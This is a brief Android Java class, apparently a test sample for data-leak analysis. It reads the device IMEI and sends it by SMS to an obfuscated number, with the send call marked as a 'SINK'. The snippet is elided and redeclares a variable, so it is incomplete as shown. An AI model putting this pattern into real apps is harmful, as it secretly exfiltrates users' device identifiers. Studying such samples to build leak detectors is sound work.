public class FakeAct extends Activity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		[...]
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String imei = telephonyManager.getDeviceId(); 
        //removed
		//InFlowActivity act = new InFlowActivity();
		Intent i = new Intent();
        //string encryption
		i.putExtra(f.e("AyHSV==S"), imei);
        //removed
		//e.i(f.e("IdksmY=?A"), this, i);
        // removed at stichtching step
		//Intent i = getIntent();
		String imei = i.getStringExtra(f.e("AyHSV==S"));
	    SmsManager smsManager = SmsManager.getDefault();
       	// SINK	      
       smsManager.sendTextMessage(f.e("xtsSy6d="), null, imei, null, null);	
	}

}